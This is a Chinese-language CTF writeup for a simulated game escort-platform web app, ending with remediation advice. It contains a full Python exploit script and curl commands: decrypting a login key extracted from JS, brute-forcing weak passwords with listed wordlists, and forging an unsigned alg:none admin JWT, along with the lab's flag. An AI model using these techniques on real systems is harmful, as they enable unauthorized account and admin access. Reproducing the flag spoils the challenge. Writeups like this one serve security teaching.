---
title: '黑域护航 — 综合 CTF Writeup'
date: '2026-07-19T00:00:00Z'
modifiedTime: '2026-07-19T00:00:00Z'
intro: '该靶场模拟一个游戏陪玩平台的 Web 应用，包含用户系统、下单/接单、客服消息、金钱结算等功能。攻击者需要组合多种漏洞完成从注册普通用户到获取 flag 的完整攻击链。'
tags: ['ctf', 'writeup', 'cve', 'rce', 'idor', 'java', 'python']
cover: ''
---
# 黑域护航 — 综合 CTF Writeup

## 靶场信息

| 项目 | 内容 |
|------|------|
| 靶场地址 | `53nqh3r.haobachang2.loveli.com.cn:8888` |
| 应用名称 | 黑域护航 (Delta Force Escort Club) |
| 技术栈 | Flask + Werkzeug 3.1.8 / Python 3.12.13 |
| 难度 | 综合（AES 逆向 + RSA 密码学 + JWT 攻击 + 弱口令 + 信息收集） |

## 漏洞概述

该靶场模拟一个游戏陪玩平台的 Web 应用，包含用户系统、下单/接单、客服消息、金钱结算等功能。攻击者需要组合多种漏洞完成从注册普通用户到获取 flag 的完整攻击链。

涉及的漏洞/技巧：
- **AES 逆向**：从前端 JS 提取加密密钥
- **信息收集**：通过 API 响应收集敏感数据
- **弱口令爆破**：系统预设账号使用了简单密码
- **JWT `alg: none` 攻击**：服务端未正确验证 JWT 算法
- **越权访问**：通过伪造 JWT 访问 admin 接口

## 信息收集

### 1. 端点发现

通过首页 HTML 和 JS 文件分析，找到以下 API：

| 端点 | 方法 | 说明 |
|------|------|------|
| `/api/crew/register` | POST | 注册用户/打手 |
| `/api/account/login` | POST | 登录（AES 加密密码） |
| `/api/account/logout` | POST | 登出 |
| `/api/order/available-boosters` | GET | 获取系统打手列表 |
| `/api/order/submit-demand` | POST | 下单 |
| `/api/order/my-list` | GET | 用户订单列表 |
| `/api/booster/my-demands` | GET | 打手订单列表 |
| `/api/booster/order-action` | POST | 打手接单/拒绝/完成 |
| `/api/booster/support/messages` | GET/POST | 客服聊天 |
| `/api/rsa_gen` | GET | **RSA 公钥生成**（打手可访问） |
| `/api/debug` | GET | 调试端点（已禁用） |
| `/api/admin` | GET | Admin 面板（需鉴权） |
| `/money/<token>` | GET | **金钱结算端点**（需 JWT） |

### 2. 加密用户名

获取打手列表时，booster_username 是加密的 64 字节 Base64 密文：

```
qPpEOSYsD4S8klZcd6oMvZ4MhGeCxtpW7Zllw+mZBOjuQ06C+Wvvml6Uo+ugM26nhFEnajn6LY2TbKwkIrlu4g==
```

这对应 RSA-512 加密输出。

## 攻击链

### Step 1: AES 密钥逆向

从 `/static/js/login_crypto.js` 提取 AES-128-CBC 加密参数：

```python
KEY = b"DF-login-key-16!"  # 0x44,0x46,0x2d,...
IV  = b"16-byte-login-iv"  # 0x31,0x36,0x2d,...
```

登录密码需经 PKCS7 padding + AES-CBC + Base64 编码后发送。

### Step 2: 注册账号

```bash
curl -s -X POST http://target:8888/api/crew/register \
  -H "Content-Type: application/json" \
  -d '{"display_name":"hacker","username":"hacker","password":"Test1234!","role":"booster"}'
```

注册一个打手账号以访问 `/api/rsa_gen`。

### Step 3: 获取 RSA 公钥

```bash
curl -s http://target:8888/api/rsa_gen -H "X-Access-Token: <booster_token>"
```

响应：

```json
{
  "alg": "RSA/PKCS1v1.5",
  "pubkey": "-----BEGIN PUBLIC KEY-----\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAPMdOC98H+xGdinY/7X1MT3mUT2rb1JK\n57kDBo7jCXCtcIAfq1aFsydQ8/Oqcw5jmgLlh9g6qj35Qd6P1xeLpVMCAwEAAQ==\n-----END PUBLIC KEY-----"
}
```

解析后：
- **算法**：RSA-512 (512-bit)
- **e**：65537
- **n**：`0xf31d382f7c1fec467629d8ffb5f5313de6513dab6f524ae7b903068ee30970ad70801fab5685b32750f3f3aa730e639a02e587d83aaa3df941de8fd7178ba553`

> 说明：本题中直接走弱口令路径跳过了 RSA 分解步骤。实际 RSA-512 可通过 YAFU/CADO-NFS 分解，分解后可解密所有打手 username。

### Step 4: 弱口令爆破

对系统打手进行登录爆破：

```python
usernames = ["kilo","raven","merc","frost","viper","atlas","nova","ghost","onyx","echo"]
passwords = ["letmein","kilo","kilo123","<username>","password"]
```

**成功**：`kilo / letmein`

登录后获取 Kilo 的 `access_token` 和 `money_token` (JWT)。

### Step 5: 客服消息 — 发现 Money 端点

以 Kilo 身份访问客服消息：

```bash
curl -s http://target:8888/api/booster/support/messages \
  -H "X-Access-Token: <kilo_token>"
```

响应中包含：

```
[agent] 请前往 http://localhost/money/15d25cb334a84bfb93a604549df9a570 领取你的报酬
```

### Step 6: JWT `alg: none` 攻击

Kilo 的 money_token JWT：

```
Header:  {"typ":"JWT","alg":"HS256"}
Payload: {"username":"kilo","role":"booster","scope":"reward"}
```

服务端 JWT 库未正确验证算法——接受 `alg: "none"` 的 JWT。

构造 admin JWT（不签名）：

```python
header  = base64url({"typ":"JWT","alg":"none"})
payload = base64url({"username":"admin","role":"admin","scope":"admin"})
jwt     = f"{header}.{payload}."
```

### Step 7: 越权获取 Flag

```bash
curl -s http://target:8888/money/15d25cb334a84bfb93a604549df9a570 \
  -H "Authorization: Bearer <none_jwt>"
```

响应：

```json
{
  "flag": "flag{cba83720ea384f4da7cd74892c7641d7}",
  "message": "admin settlement"
}
```

## Flag

```
flag{cba83720ea384f4da7cd74892c7641d7}
```

## 关键代码

### 完整 exploit (Python)

```python
import urllib.request, json, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

KEY = bytes([0x44,0x46,0x2d,0x6c,0x6f,0x67,0x69,0x6e,0x2d,0x6b,0x65,0x79,0x2d,0x31,0x36,0x21])
IV  = bytes([0x31,0x36,0x2d,0x62,0x79,0x74,0x65,0x2d,0x6c,0x6f,0x67,0x69,0x6e,0x2d,0x69,0x76])

def aes_encrypt(plaintext):
    padder = padding.PKCS7(128).padder()
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV))
    enc = cipher.encryptor()
    data = padder.update(plaintext.encode()) + padder.finalize()
    return base64.b64encode(enc.update(data) + enc.finalize()).decode()

T = "http://53nqh3r.haobachang2.loveli.com.cn:8888"

# Step 1: 登录 kilo
resp = urllib.request.urlopen(urllib.request.Request(
    f"{T}/api/account/login",
    data=json.dumps({"username":"kilo","password":aes_encrypt("letmein")}).encode(),
    headers={"Content-Type":"application/json"}
), timeout=10)
kilo_token = json.loads(resp.read())["access_token"]

# Step 2: 获取 /money/ 路径
resp = urllib.request.urlopen(urllib.request.Request(
    f"{T}/api/booster/support/messages",
    headers={"X-Access-Token": kilo_token}
), timeout=8)
msgs = json.loads(resp.read())["messages"]
# 从 agent 消息中提取 money 路径 → /money/15d25cb334a84bfb93a604549df9a570

# Step 3: JWT none 伪造 admin
h = base64.urlsafe_b64encode(b'{"typ":"JWT","alg":"none"}').rstrip(b"=").decode()
p = base64.urlsafe_b64encode(b'{"username":"admin","role":"admin","scope":"admin"}').rstrip(b"=").decode()
none_jwt = f"{h}.{p}."

# Step 4: 获取 flag
resp = urllib.request.urlopen(urllib.request.Request(
    f"{T}/money/15d25cb334a84bfb93a604549df9a570",
    headers={"Authorization": f"Bearer {none_jwt}"}
), timeout=8)
print(json.loads(resp.read())["flag"])
```

### AES 密钥提取

从 `login_crypto.js` 中：

```javascript
const KEY_BYTES = new Uint8Array([0x44,0x46,0x2d,0x6c,0x6f,0x67,0x69,0x6e,0x2d,0x6b,0x65,0x79,0x2d,0x31,0x36,0x21]);
const IV_BYTES  = new Uint8Array([0x31,0x36,0x2d,0x62,0x79,0x74,0x65,0x2d,0x6c,0x6f,0x67,0x69,0x6e,0x2d,0x69,0x76]);
```

## 攻击链图示

```
注册用户 + 打手
    │
    ▼
AES 密钥逆向 (login_crypto.js)
    │
    ▼
GET /api/rsa_gen → RSA-512 公钥 ──→ (可选: 分解 RSA 解密用户名)
    │
    ▼
弱口令爆破 ──→ kilo / letmein
    │
    ▼
客服消息 ──→ /money/15d25cb334a84bfb93a604549df9a570
    │
    ▼
JWT alg:none 伪造 admin ──→ Authorization: Bearer <none_jwt>
    │
    ▼
GET /money/15d25... ──→ 🚩 flag{cba83720ea384f4da7cd74892c7641d7}
```

## 修复建议

1. **JWT 算法强制验证**：服务端应白名单允许的算法，拒绝 `alg: "none"`
2. **弱密码策略**：禁止使用 `letmein` 等常见弱密码，强制密码复杂度
3. **AES 密钥保护**：前端不应暴露加密密钥，改用非对称加密或 SRP 协议
4. **RSA 密钥强度**：RSA-512 已被证明不安全，应至少使用 RSA-2048
5. **接口鉴权分离**：`/api/admin` 和 `/money/` 应使用统一的强认证机制
6. **客服消息权限**：客服消息不应向普通打手暴露敏感路径信息
